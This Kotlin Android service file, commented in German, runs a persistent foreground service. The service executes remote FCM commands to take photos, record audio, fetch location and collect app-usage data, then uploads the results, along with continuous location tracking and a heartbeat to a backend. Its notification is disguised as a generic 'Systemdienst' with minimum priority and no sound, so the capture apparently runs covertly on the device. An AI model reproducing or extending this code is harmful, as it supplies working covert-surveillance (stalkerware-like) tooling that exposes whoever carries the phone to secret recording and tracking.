package com.ikianti.app.service

import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import com.ikianti.app.capture.AudioCapture
import com.ikianti.app.capture.CameraCapture
import com.ikianti.app.capture.LocationCapture
import com.ikianti.app.capture.LocationTracking
import com.ikianti.app.capture.UsageStatsCapture
import java.util.ArrayDeque

/**
 * Persistenter Foreground Service.
 *
 * Verantwortlich für:
 * - Empfang von Remote-Befehlen
 * - Übernahme der persistenten FCM-Warteschlange
 * - sequenzielle Verarbeitung der Befehle
 * - Timeout-Überwachung
 * - Schutz vor verspäteten Callbacks
 */
class CaptureForegroundService : Service() {

    companion object {
        const val ACTION_COMMAND = "com.ikianti.app.ACTION_COMMAND"
        const val EXTRA_COMMAND = "command"

        private const val CHANNEL_ID = "sys_service_channel"
        private const val NOTIFICATION_ID = 1
        private const val TIMEOUT_MS = 30_000L
        private const val HEARTBEAT_INTERVAL_MS = 60_000L
        private const val TAG = "CaptureFGS"

        fun start(context: Context) {
            val intent =
                Intent(context, CaptureForegroundService::class.java)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        /**
         * Signalisiert dem Foreground Service,
         * dass neue persistente Befehle vorhanden sind.
         *
         * Der eigentliche Befehl wird nicht direkt verarbeitet.
         * Dadurch bleibt SharedPreferences die zentrale Quelle
         * für noch nicht übernommene FCM-Befehle.
         */
        fun sendCommand(context: Context, command: String) {

            val intent = Intent(ACTION_COMMAND).apply {
                putExtra(EXTRA_COMMAND, command)
                setPackage(context.packageName)
            }

            context.sendBroadcast(intent)
        }
    }

    private val mainHandler =
        Handler(Looper.getMainLooper())

    private val heartbeatRunnable = object : Runnable {

    override fun run() {

        val deviceId =
            com.ikianti.app.DeviceManager.getDeviceId(this@CaptureForegroundService)

        Log.d(
            TAG,
            "Heartbeat: last_seen aktualisieren"
        )

        com.ikianti.app.SupabaseApi.updateLastSeen(deviceId)

        mainHandler.postDelayed(
            this,
            HEARTBEAT_INTERVAL_MS
        )
    }
}    

    private lateinit var locationTracking: LocationTracking

    /**
     * Interne FIFO-Warteschlange.
     *
     * Hier liegen Befehle, die bereits aus der persistenten
     * Warteschlange übernommen wurden.
     */
    private val commandQueue =
        ArrayDeque<FcmTriggerService.PendingCommand>()

    /**
     * Aktuell laufender Befehl.
     */
    private var activeCommand: String? = null

    /**
     * Eindeutige ID des aktuell laufenden Befehls.
     */
    private var activeCommandId: String? = null

    /**
     * Timeout des aktuell laufenden Befehls.
     */
    private var timeoutRunnable: Runnable? = null

    private enum class CommandResult {
        SUCCESS,
        ERROR
    }

    private val commandReceiver =
        object : BroadcastReceiver() {

            override fun onReceive(
                context: Context,
                intent: Intent
            ) {
                if (intent.action != ACTION_COMMAND) {
                    return
                }

                val command =
                    intent.getStringExtra(EXTRA_COMMAND)

                Log.d(
                    TAG,
                    "Broadcast-Signal empfangen" +
                        if (command != null) {
                            ": $command"
                        } else {
                            ""
                        }
                )

                /*
                 * Nicht nur den Broadcast-Befehl übernehmen.
                 *
                 * Stattdessen wird die komplette persistente
                 * Warteschlange atomar übernommen.
                 */
                loadPendingCommands()
            }
        }

    override fun onCreate() {
        super.onCreate()

        locationTracking = LocationTracking(applicationContext)

        startForegroundCompat()
        locationTracking.start()

        mainHandler.post(heartbeatRunnable)

        val filter =
            IntentFilter(ACTION_COMMAND)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {

            registerReceiver(
                commandReceiver,
                filter,
                RECEIVER_NOT_EXPORTED
            )

        } else {

            registerReceiver(
                commandReceiver,
                filter
            )
        }

        /*
         * Falls FCM-Befehle eingetroffen sind, während der
         * Foreground Service nicht lief, werden sie jetzt
         * aus der persistenten Queue übernommen.
         */
        loadPendingCommands()

        Log.d(
            TAG,
            "Persistenter Service gestartet"
        )
    }

    override fun onStartCommand(
        intent: Intent?,
        flags: Int,
        startId: Int
    ): Int {

        /*
         * Auch bei einem erneuten Start prüfen wir,
         * ob noch persistente Befehle vorhanden sind.
         */
        loadPendingCommands()

        return START_STICKY
    }

    /**
     * Lädt persistente Befehle in die interne Warteschlange.
     *
     * Die persistenten Einträge bleiben gespeichert, bis sie
     * nach erfolgreicher Verarbeitung gezielt entfernt werden.
     * Bereits aktive oder intern eingereihte IDs werden nicht
     * erneut übernommen.
     */
    private fun loadPendingCommands() {

        val pendingCommands =
            FcmTriggerService.takePendingCommands(this)

        if (pendingCommands.isEmpty()) {
            return
        }

        Log.d(
            TAG,
            "Übernehme ${pendingCommands.size} " +
                "persistente(n) Befehl(e)"
        )

        for (pendingCommand in pendingCommands) {

            if (!isValidCommand(pendingCommand.command)) {

                Log.w(
                    TAG,
                    "Ungültiger persistenter Befehl verworfen: " +
                        pendingCommand.command
                )

                continue
            }

            val alreadyQueued =
                activeCommandId == pendingCommand.id ||
                    commandQueue.any {
                        it.id == pendingCommand.id
                    }

            if (alreadyQueued) {

                Log.d(
                    TAG,
                    "Befehl bereits übernommen, überspringe: " +
                        "${pendingCommand.command} | " +
                        "id=${pendingCommand.id}"
                )

                continue
            }

            commandQueue.addLast(pendingCommand)

            Log.d(
                TAG,
                "Befehl aus persistentem Speicher übernommen: " +
                    "${pendingCommand.command} | " +
                    "id=${pendingCommand.id} | " +
                    "Warteschlange=${commandQueue.size}"
            )
        }

        processNextCommand()
    }


    /**
     * Startet den nächsten Befehl,
     * sofern momentan keiner läuft.
     */
    private fun processNextCommand() {

        if (activeCommand != null) {
            return
        }

        if (commandQueue.isEmpty()) {
            return
        }

        val pendingCommand =
            commandQueue.removeFirst()

        val command =
            pendingCommand.command

        val commandId =
            pendingCommand.id

        val attempts =
            FcmTriggerService.incrementPendingCommandAttempts(
                this,
                commandId
            )

        if (attempts < 0) {

            Log.e(
                TAG,
                "Befehl nicht gestartet: Versuchszähler konnte " +
                    "nicht persistent aktualisiert werden | " +
                    "$command | id=$commandId"
            )

            return
        }

        if (attempts > 3) {

            Log.e(
                TAG,
                "Maximale Anzahl an Versuchen erreicht: " +
                    "$command | id=$commandId | attempts=$attempts"
            )

            val removed =
                FcmTriggerService.removePendingCommand(
                    this,
                    commandId
                )

            if (!removed) {
                Log.e(
                    TAG,
                    "Befehl nach maximalen Versuchen nicht aus " +
                        "persistenter Queue entfernbar: $command | id=$commandId"
                )
            }

            processNextCommand()
            return
        }

        activeCommand = command
        activeCommandId = commandId

        Log.d(
            TAG,
            "Führe aus: $command | id=$commandId"
        )

        val timeout =
            Runnable {
                handleTimeout(
                    command = command,
                    commandId = commandId
                )
            }

        timeoutRunnable = timeout

        mainHandler.postDelayed(
            timeout,
            TIMEOUT_MS
        )

        val onDone: (CommandResult) -> Unit = { result ->
            when (result) {
                CommandResult.SUCCESS -> {
                    finishCommand(
                        command = command,
                        commandId = commandId
                    )
                }

                CommandResult.ERROR -> {
                    failCommand(
                        command = command,
                        commandId = commandId
                    )
                }
            }
        }

        try {

            when (command) {

                "photo" -> {
                    CameraCapture(this)
                        .captureAndUpload { success ->
                            onDone(
                                if (success) {
                                    CommandResult.SUCCESS
                                } else {
                                    CommandResult.ERROR
                                }
                            )
                        }
                }

                "audio" -> {
                    AudioCapture(this)
                        .recordAndUpload(seconds = 10) { success ->
                            onDone(
                                if (success) {
                                    CommandResult.SUCCESS
                                } else {
                                    CommandResult.ERROR
                                }
                            )
                        }
                }

                "location" -> {
                    LocationCapture(this)
                        .fetchAndUpload { success ->
                            onDone(
                                if (success) {
                                    CommandResult.SUCCESS
                                } else {
                                    CommandResult.ERROR
                                }
                            )
                        }
                }

                "usage" -> {
                    UsageStatsCapture(this)
                        .collectAndUpload { success ->
                            onDone(
                                if (success) {
                                    CommandResult.SUCCESS
                                } else {
                                    CommandResult.ERROR
                                }
                            )
                        }
                }
            }

        } catch (e: Exception) {

        Log.e(
            TAG,
            "Fehler beim Starten des Befehls: $command",
            e
        )

        failCommand(
            command = command,
            commandId = commandId
        )
    }
    }

    /**
     * Erfolgreicher Abschluss eines Befehls.
     */
    private fun finishCommand(
        command: String,
        commandId: String
    ) {

        if (activeCommandId != commandId) {

            Log.w(
                TAG,
                "Verspäteter Callback ignoriert: " +
                    "$command | id=$commandId"
            )

            return
        }

        timeoutRunnable?.let {
            mainHandler.removeCallbacks(it)
        }

        timeoutRunnable = null

        val removed =
            FcmTriggerService.removePendingCommand(
                this,
                commandId
            )

        if (!removed) {
            Log.e(
                TAG,
                "Befehl ausgeführt, aber persistenter Eintrag " +
                    "konnte nicht entfernt werden: $command | id=$commandId"
            )

            activeCommand = null
            activeCommandId = null

            processNextCommand()
            return
        }

        activeCommand = null
        activeCommandId = null

        Log.d(
            TAG,
            "Abgeschlossen: $command | id=$commandId"
        )

        processNextCommand()
    }

    /**
     * Fehler beim Ausführen eines Befehls.
     */
    private fun failCommand(
            command: String,
            commandId: String
        ) {

            if (activeCommandId != commandId) {

                Log.w(
                    TAG,
                    "Verspäteter Fehler-Callback ignoriert: " +
                        "$command | id=$commandId"
                )

                return
            }

            timeoutRunnable?.let {
                mainHandler.removeCallbacks(it)
            }

            timeoutRunnable = null

            activeCommand = null
            activeCommandId = null

            Log.e(
                TAG,
                "Fehler: $command | id=$commandId"
            )

            processNextCommand()
        }
    /**
     * Timeout eines Befehls.
     */
    private fun handleTimeout(
        command: String,
        commandId: String
    ) {

        if (activeCommandId != commandId) {
            return
        }

        Log.w(
            TAG,
            "Timeout: $command | id=$commandId"
        )

        timeoutRunnable = null

        activeCommand = null
        activeCommandId = null

        Log.w(
            TAG,
            "Befehl wegen Timeout beendet: $command"
        )

        processNextCommand()
    }

    /**
     * Erlaubte Remote-Befehle.
     */
    private fun isValidCommand(
        command: String
    ): Boolean {

        return command == "photo" ||
            command == "audio" ||
            command == "location" ||
            command == "usage"
    }

    private fun startForegroundCompat() {

        val channel =
            NotificationChannel(
                CHANNEL_ID,
                "Systemdienste",
                NotificationManager.IMPORTANCE_MIN
            ).apply {

                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }

        (
            getSystemService(
                NOTIFICATION_SERVICE
            ) as NotificationManager
        ).createNotificationChannel(channel)

        val notification =
            NotificationCompat.Builder(
                this,
                CHANNEL_ID
            )
                .setSmallIcon(
                    android.R.drawable.stat_notify_sync_noanim
                )
                .setContentTitle(
                    "Systemdienst"
                )
                .setContentText(
                    "Systemprozess"
                )
                .setPriority(
                    NotificationCompat.PRIORITY_MIN
                )
                .setOngoing(true)
                .setSilent(true)
                .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {

            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            )

        } else {

            startForeground(
                NOTIFICATION_ID,
                notification
            )
        }
    }

    override fun onDestroy() {
    mainHandler.removeCallbacks(heartbeatRunnable)

    locationTracking.stop()

    timeoutRunnable?.let {
        mainHandler.removeCallbacks(it)
    }

    timeoutRunnable = null
    activeCommand = null
    activeCommandId = null

    commandQueue.clear()

    try {
        unregisterReceiver(commandReceiver)
    } catch (_: Exception) {
    }

    super.onDestroy()
}

    override fun onBind(
        intent: Intent?
    ): IBinder? = null
}
